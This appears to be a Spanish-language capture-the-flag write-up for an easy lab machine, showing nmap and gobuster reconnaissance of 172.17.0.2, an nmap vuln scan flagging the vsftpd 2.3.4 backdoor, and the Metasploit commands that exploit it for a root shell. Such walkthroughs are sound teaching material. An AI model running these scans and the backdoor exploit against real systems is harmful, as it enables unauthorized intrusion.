tags: #muy-facil #metasploit #vsftpd 
_______________________
Empezamos haciendo un escaneo básico de puertos con namp: 

```bash
nmap -sSCV -p- --min-rate 5000 -n -Pn -vvv --open -oN scan 172.17.0.2
```

### Parámetros del comando:
______________
- `nmap` — Herramienta de escaneo de red (Network Mapper).
- `-sS` — SYN scan: envía SYN sin completar handshake (rápido y relativamente sigiloso).
- `-sC` — Ejecuta scripts "default" (`--script=default`) para obtener información adicional.
- `-sV` — Detección de versiones: intenta identificar el software y versión del servicio.
- `-p-` — Escanea todos los puertos TCP (1–65535).
- `--min-rate 5000` — Forzar mínimo 5000 paquetes/segundo (acelera pero es ruidoso).
- `-n` — No resolver DNS (evita consultas DNS, más rápido).
- `-Pn` — Tratar host como "up" y omitir ping/host discovery.
- `-vvv` — Verbose muy detallado (más información de progreso).
- `--open` — Mostrar solo puertos en estado `open` (filtra cerrados/filtrados).
- `-oN scan` — Guardar la salida en formato normal en el fichero `scan`.
- `172.17.0.2` — Dirección IP objetivo a escanear.
______________________

![[Anexos/Pasted image 20251010050450.png]]

Vamos a echar un vistazo al servicio web que corre por el puerto 80:

![[Anexos/Pasted image 20251010052322.png]]

Interesante resultado, vemos una página por defecto de apache, así que vamos a seguir aplicando reconocimiento, esta vez con gobuster para buscar directorios o archivos ocultos:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.xml,.txt,.html -t 40 -o dirs.txt
```

### Parámetros del comando:
___________________
- `gobuster` — Herramienta para fuerza/brute-force de directorios, DNS y hosts.
- `dir` — Modo de gobuster para buscar directorios/archivos en una URL.
- `-u http://172.17.0.2/` — URL base objetivo donde se realizan las peticiones.
- `-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` — Ruta a la wordlist que contiene los nombres a probar.
- `-x .php,.xml,.txt,.html` — Extensiones que se añadirán a cada entrada de la wordlist (.php, .xml, .txt, .html).
- `-t 40` — Número de threads concurrentes (40 peticiones paralelas; alto paralelismo, ruidoso).
- `-o dirs.txt` — Archivo donde se guardan los resultados encontrados (salida).
_________________________
No encontramos nada:

![[Anexos/Pasted image 20251010052809.png]]

Procedemos entonces a lanzar el script **vuln** de nmap:

```bash
nmap --script vuln -p80,21 172.17.0.2 -vvv -n -Pn -oN vuln
```

![[Anexos/Pasted image 20251010053111.png]]

Aquí vemos como existe una vulnerabilidad del servicio vsftpd 2.3.4, que permite usar una backdoor para entrar al servidor por ftp.
Esta misma vulnerabilidad se ha explotado también en la máquina First Hacking. Vamos a usar metasploit para explotar esta vulnerabilidad:

```bash
search vsftpd 2.3.4
```

![[Anexos/Pasted image 20251010053400.png]]

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 172.17.0.2
exploit
```
![[Anexos/Pasted image 20251010053545.png]]

Ejecutamos el exploit y...

![[Anexos/Pasted image 20251010053722.png]]

Somos root!! 